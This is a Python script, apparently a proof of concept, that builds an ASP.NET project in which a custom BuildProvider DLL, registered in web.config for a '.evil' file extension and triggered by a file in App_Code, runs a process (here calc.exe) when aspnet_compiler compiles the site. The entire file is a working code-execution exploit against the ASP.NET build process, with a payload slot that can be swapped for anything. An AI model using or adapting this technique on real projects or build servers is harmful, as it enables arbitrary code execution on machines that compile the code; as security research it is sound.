import os
import shutil
import subprocess
import sys

ASPNET_COMPILER = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
CSC_COMPILER = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

BASE_DIR = r"C:\Temp\AspNetExploit"
SOURCE_DIR = os.path.join(BASE_DIR, "webapp")
BIN_DIR = os.path.join(SOURCE_DIR, "bin")
APP_CODE_DIR = os.path.join(SOURCE_DIR, "App_Code")
COMPILED_DIR = os.path.join(BASE_DIR, "compiled")

DLL_NAME = "Exploit.dll"
NAMESPACE = "Exploit"
CLASS_NAME = "Exploit"
FULL_TYPE_NAME = f"{NAMESPACE}.{CLASS_NAME}, {os.path.splitext(DLL_NAME)[0]}"

def prepare_structure():
    if os.path.exists(BASE_DIR):
        shutil.rmtree(BASE_DIR)
    os.makedirs(APP_CODE_DIR)
    os.makedirs(BIN_DIR)

    cs_file = os.path.join(BASE_DIR, "Exploit.cs")
    with open(cs_file, "w") as f:
        f.write(f"""
using System;
using System.CodeDom.Compiler;
using System.Web.Compilation;
using System.Diagnostics;

namespace {NAMESPACE}
{{
    public class {CLASS_NAME} : BuildProvider
    {{
        public override void GenerateCode(AssemblyBuilder assemblyBuilder)
        {{
            Process.Start("calc.exe");
        }}
    }}
}}
""")
    return cs_file

def compile_dll(cs_path):
    dll_path = os.path.join(BIN_DIR, DLL_NAME)
    try:
        subprocess.run([
            CSC_COMPILER,
            "/target:library",
            f"/out:{dll_path}",
            cs_path,
            "/reference:System.Web.dll"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError:
        sys.exit(1)

def write_web_config():
    config_path = os.path.join(SOURCE_DIR, "web.config")
    with open(config_path, "w") as f:
        f.write(f"""
<configuration>
  <system.web>
    <compilation>
      <buildProviders>
        <add extension=".evil" type="{FULL_TYPE_NAME}"/>
      </buildProviders>
    </compilation>
  </system.web>
</configuration>
""")

def add_trigger_file():
    evil_file = os.path.join(APP_CODE_DIR, "run.evil")
    with open(evil_file, "w") as f:
        f.write("// trigger")

def compile_with_aspnet():
    subprocess.run([
        ASPNET_COMPILER,
        "-v", "none",
        "-p", SOURCE_DIR,
        "-f", COMPILED_DIR,
        "-u"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)

def main():
    cs_path = prepare_structure()
    compile_dll(cs_path)
    write_web_config()
    add_trigger_file()
    compile_with_aspnet()

if __name__ == "__main__":
    main()
